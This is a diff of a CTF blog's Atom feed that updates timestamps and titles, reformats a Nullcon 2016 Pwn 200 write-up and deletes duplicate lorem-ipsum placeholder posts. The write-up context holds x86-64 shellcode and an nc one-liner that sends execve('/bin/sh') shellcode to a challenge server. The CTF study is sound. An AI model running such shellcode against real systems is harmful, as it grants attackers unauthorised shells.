@@ -4,7 +4,7 @@
   <title><![CDATA[pwn_expoit Blog]]></title>
   <link href="http://mashirogod.github.io/atom.xml" rel="self"/>
   <link href="http://mashirogod.github.io/"/>
-  <updated>2016-02-14T03:15:56-08:00</updated>
+  <updated>2016-02-14T04:34:24-08:00</updated>
   <id>http://mashirogod.github.io/</id>
   <author>
     <name><![CDATA[pwn_expoit]]></name>
@@ -14,7 +14,7 @@
 
   
   <entry>
-    <title type="html"><![CDATA[2016 nullcon pwn 200]]></title>
+    <title type="html"><![CDATA[2016 Nullcon Pwn 200]]></title>
     <link href="http://mashirogod.github.io/blog/2016/01/31/2016-nullcon-pwn-200/"/>
     <updated>2016-01-31T17:35:45-08:00</updated>
     <id>http://mashirogod.github.io/blog/2016/01/31/2016-nullcon-pwn-200</id>
@@ -162,24 +162,23 @@ i saved stack. then stack overwrite rip :P.
     <span class="nf">mov</span> <span class="no">qword</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>
     <span class="nf">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">8</span>
     <span class="nf">syscall</span>
-
-        <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>                                                                                                    
-        <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>                                                                                                    
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span><span class="mi">0x4011f4</span>                                                                                        
-        <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">4</span>                                                                                                    
-        <span class="no">syscall</span>                                                                                                       
-                                                                                                                      
-        <span class="no">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>                                                                                                  
-        <span class="no">xor</span> <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>                                                                                                  
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">4</span>                                                                                              
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x602008</span>                                                                                       
-        <span class="no">syscall</span>                                                                                                       
-                                                                                                                      
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>                                                                                              
-        <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">FD</span>                                                                                                   
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x602008</span>                                                                                       
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">4</span>                                                                                              
-        <span class="no">syscall</span>
+        <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>
+    <span class="nf">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>  
+    <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span><span class="mi">0x4011f4</span>                            
+    <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">4</span>      
+    <span class="no">syscall</span>
+       
+    <span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>                                       
+    <span class="no">xor</span> <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>                                    
+    <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">4</span>                 
+    <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x602008</span>                             
+    <span class="no">syscall</span>                                            
+                                                    
+        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>                                       
+    <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">FD</span>                        
+    <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x602008</span>                    
+    <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">4</span>                                     
+    <span class="no">syscall</span>
     
     <span class="nf">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x600</span>
     <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">0</span>
@@ -189,30 +188,30 @@ i saved stack. then stack overwrite rip :P.
     <span class="nf">syscall</span>
     <span class="nf">mov</span> <span class="no">qword</span> <span class="err">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x234</span><span class="err">]</span><span class="p">,</span> <span class="no">r9</span> <span class="err">&lt;</span><span class="p">--------</span> <span class="no">overwrite</span> <span class="no">rip</span>
     <span class="nf">mov</span> <span class="no">qword</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>                                                                                              
-        <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">FD</span>                                                                                                   
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsp</span>                                                                                            
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">0x500</span>                                                                                          
-        <span class="no">syscall</span>                                                                                                       
-        <span class="no">add</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x600</span>                                                                                                
-                                                                                                                      
-        <span class="no">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>                                                                                                  
-        <span class="no">xor</span> <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>                                                                                                  
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x6020b8</span>                                                                                       
-        <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">119</span>                                                                                                  
-        <span class="no">syscall</span>                                                                                                       
-                                                                                                                      
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>                                                                                              
-        <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>                                                                                                    
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x6020B8</span>                                                                                       
-        <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">119</span>                                                                                            
-        <span class="no">syscall</span></code></pre></div>
+        <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">FD</span>                                            
+    <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsp</span>                                         
+    <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">0x500</span>                                     
+    <span class="no">syscall</span>                                             
+    <span class="no">add</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x600</span>                                     
+                                           
+    <span class="no">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>                                  
+    <span class="no">xor</span> <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>                      
+    <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x6020b8</span>                      
+    <span class="no">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">119</span>                                   
+    <span class="no">syscall</span>                                         
+                                             
+    <span class="no">mov</span> <span class="no">qword</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>                              
+    <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>                     
+    <span class="no">mov</span> <span class="no">qword</span> <span class="no">rsi</span><span class="p">,</span> <span class="mi">0x6020B8</span>          
+    <span class="no">mov</span> <span class="no">qword</span> <span class="no">rdx</span><span class="p">,</span> <span class="mi">119</span>                               
+    <span class="no">syscall</span></code></pre></div>
 
 
 <p><br></p>
 
 <h2>exploit</h2>
 
-<pre><code>
+<pre></code>
 (python -c 'print ("\x0e")'; python -c 'print (open("shell.bin").read()+"A"*2360)'; python -c 'print ("\x0e"+"\x60\x02\x00\x00"+"http://"+"\x90"*(0x220-49)+"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"+"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"+"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"+"\x58\x0f\x05"+"C"*8+"\x6c\x11\x40"+"\x00"*5)';cat)|nc 52.72.171.221 9982
 </code></pre>
 
@@ -220,7 +219,7 @@ i saved stack. then stack overwrite rip :P.
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[32c3 pwn[200] readme write up]]></title>
+    <title type="html"><![CDATA[32c3 Pwn[200] Readme Write Up]]></title>
     <link href="http://mashirogod.github.io/blog/2015/12/31/32c3-pwn-200-readme-write-up/"/>
     <updated>2015-12-31T07:16:00-08:00</updated>
     <id>http://mashirogod.github.io/blog/2015/12/31/32c3-pwn-200-readme-write-up</id>
@@ -464,7 +463,7 @@ above the environment variable it make that show error messege on remote server<
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[Plaid ctf kappa[275] in 2014]]></title>
+    <title type="html"><![CDATA[Plaid Ctf Kappa[275] in 2014]]></title>
     <link href="http://mashirogod.github.io/blog/2015/12/26/plaid-ctf-kappa-275-in-2014/"/>
     <updated>2015-12-26T01:13:36-08:00</updated>
     <id>http://mashirogod.github.io/blog/2015/12/26/plaid-ctf-kappa-275-in-2014</id>
@@ -929,7 +928,7 @@ this method can become vulnerability on UAF. for now, i perceived it vulnerabilt
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[exploit-exercise fusion level4]]></title>
+    <title type="html"><![CDATA[Exploit-exercise Fusion Level4]]></title>
     <link href="http://mashirogod.github.io/blog/2015/11/15/exploit-exercise-fusion-level4/"/>
     <updated>2015-11-15T05:51:33-08:00</updated>
     <id>http://mashirogod.github.io/blog/2015/11/15/exploit-exercise-fusion-level4</id>
@@ -1272,7 +1271,7 @@ this method can become vulnerability on UAF. for now, i perceived it vulnerabilt
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[2015 DEFCON babyfirstheap]]></title>
+    <title type="html"><![CDATA[2015 DEFCON Babyfirstheap]]></title>
     <link href="http://mashirogod.github.io/blog/2015/11/15/2015-defcon-babyfirstheap/"/>
     <updated>2015-11-15T04:21:48-08:00</updated>
     <id>http://mashirogod.github.io/blog/2015/11/15/2015-defcon-babyfirstheap</id>
@@ -1477,741 +1476,6 @@ this method can become vulnerability on UAF. for now, i perceived it vulnerabilt
 </span></code></pre></td></tr></table></div></figure>
 
 
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-9/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-9</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-8/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-8</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-7/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-7</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-6/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-6</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-5/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-5</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-4/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-4</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-3/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-3</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-2/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-2</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-16/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-16</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-15/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-15</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-14/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-14</id>
-    <content type="html"><![CDATA[<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-
-<p>Some code:</p>
-
-<pre><code class="js">var hello = function (name) {
-  console.log("Hello, " + name + '.');
-}
-hello('World');   // prints 'Hello, World.' to stdout
-</code></pre>
-
-<!-- More -->
-
-
-<h2>Some more code</h2>
-
-<pre><code class="ruby">def test
-  @answer = 6*9
-  if @answer != 42  # this should never happen
-    raise "Oh no, not again."
-  else
-    print "Don't panic."
-end
-</code></pre>
-
-<h2>this is a sample header</h2>
-
-<p>Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod
-tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At
-vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren,
-no sea takimata sanctus est Lorem ipsum dolor sit amet.</p>
-<div class="footnotes">
-<hr/>
-<ol>
-<li id="fn:1">
-<p>The footnote <a href="http://www.example.com">content</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
-</ol>
-</div>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Of lorems and ipsii]]></title>
-    <link href="http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-13/"/>
-    <updated>2014-12-22T16:04:23-08:00</updated>
-    <id>http://mashirogod.github.io/blog/2014/12/22/of-lorems-and-ipsii-13</id>
